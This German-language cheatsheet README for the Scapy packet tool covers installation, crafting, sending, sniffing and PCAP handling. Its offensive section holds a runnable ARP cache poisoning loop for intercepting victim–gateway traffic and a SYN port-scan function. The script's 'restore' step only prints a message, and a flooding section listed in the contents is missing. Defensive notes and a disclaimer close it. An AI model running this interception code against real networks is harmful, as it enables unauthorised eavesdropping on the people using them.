<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Netzwerkangriffe">
</p>

<p align="center">
  <b>🐍 Das ultimative Python-basierte interaktive Paketmanipulationstool und die Bibliothek, die in der Lage sind, beliebige Netzwerkpakete zu fälschen, zu senden, zu schnüffeln, zu zerlegen und zu verfälschen</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht und das Stacking-Layer-Modell (`/`)](#-overview--the-stacking-layer-model-)
- [Installation](#-Installation)
- [Starten der interaktiven Shell](#-starting-the-interactive-shell)
- [Netzwerkpakete erstellen](#-crafting-network-packets)
  - [IP- und TCP-Handshakes](#ip-and-tcp-handshakes)
  - [ICMP Ping & Traceroute](#icmp-ping--traceroute)
  - [DNS-Abfragen und -Auflösung](#dns-queries--resolution)
- [Pakete senden und empfangen](#-sending--receiving-packets)
  - [Schicht 3: `send()`, `sr()`, `sr1()`](#layer-3-send-sr-sr1)
  - [Schicht 2: `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
- [Paket-Sniffing und PCAP-Handling](#-packet-sniffing--pcap-handling)
  - [Live-Pakete erfassen (`sniff()`)](#capturing-live-packets-sniff)
  - [PCAP-Dateien lesen und schreiben](#reading--writing-pcap-files)
- [Offensive Netzwerkangriffe](#-offensive-network-attacks)
  - [ARP Cache Poisoning (MITM)](#arp-cache-poisoning-mitm)
  - [SYN-Port-Scanning-Skript](#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und das Stacking-Layer-Modell (`/`)

**Scapy** wurde von **Philippe Biondi** entwickelt und ersetzt Dutzende von Einzweck-Netzwerk-Tools (Ping, Traceroute, Arpspoof, Nmap-Stubs).

Die Genialität von Scapy liegt in der Verwendung des Divisionsoperators (`/`) von Python, um Protokollschichten zusammenzustapeln:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Jedes Layer-Feld verfügt über sinnvolle Standardwerte, die Scapy automatisch berechnet (Prüfsummen, Längen, MAC-Adressen, Quell-IP).

---

## 📥 Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Starten der interaktiven Shell

Starten Sie die interaktive REPL-Shell (erfordert Root-Rechte, um Raw-Sockets zu fälschen):
```bash
sudo scapy
```
Überprüfen Sie die verfügbaren Protokolle und Funktionen in Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Erstellen von Netzwerkpaketen

### IP- und TCP-Handshakes
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP-Ping und Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### DNS-Abfragen und -Auflösung
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Senden und Empfangen von Paketen

Scapy trennt die Übertragung nach OSI-Schicht:

### Schicht 3: `send()`, `sr()`, `sr1()`
Funktioniert mit vom Kernel zugewiesenen Ethernet-Headern (beginnt auf der IP-Ebene):
- `send(pkt)`: Überträgt Pakete auf Layer 3; wartet nicht auf eine Antwort.
- `sr(pkt)`: Sendet Pakete und sendet beantwortete und unbeantwortete Paare zurück `(ans, unans)`.
- `sr1(pkt)`: Sendet ein Paket und gibt nur das erste Antwortpaket zurück.

### Schicht 2: `sendp()`, `srp()`, `srp1()`
Benutzerdefiniertes Ethernet-/Datenverbindungs-Framing (beginnt bei `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: Raw-Ethernet-Frame senden.
- `srp(Ether() / ARP(...))`: ARP-Anfrage senden und Antwort empfangen.

---

## 🔍 Paket-Sniffing und PCAP-Handhabung

### Live-Pakete erfassen (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lesen und Schreiben von PCAP-Dateien
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Offensive Netzwerkangriffe

### ARP Cache Poisoning (MITM)
Spoofing von ARP-Tabellen zum Abfangen des Datenverkehrs zwischen Opfer und Gateway:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### SYN-Port-Scan-Skript
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Scapy-Befehl |
|-----------|---------------|
| **Interaktive Shell starten** | `sudo scapy` |
| **Protokollfelder prüfen** | `ls(IP)` oder `ls(TCP)` |
| **L3-Paket senden** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Erste Antwort senden und empfangen**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **L2-Ethernet-Frame senden** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Schnüffeln mit BPF-Filter** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Auf PCAP speichern** | `wrpcap("out.pcap", pkts)` |
| **Aus PCAP lesen** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **Dynamische ARP-Inspektion (DAI):** Konfigurieren Sie Unternehmens-Switches mit DAI und DHCP-Snooping, um gefälschte, unentgeltliche ARP-Antworten zu verwerfen.
2. **IDS/Suricata-Regeln:** Schnelle halboffene SYN-Sweeps und fehlerhafte TCP-Flag-Kombinationen (Xmas, NULL), die von Scapy generiert werden, lösen standardmäßige IDS-Warnungen aus.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Scapy kann fehlerhafte Pakete generieren, die Denial-of-Service-Zustände verursachen oder private Daten abfangen. Es muss ausschließlich in autorisierten Sicherheitsbewertungen und isolierten Testnetzwerken verwendet werden.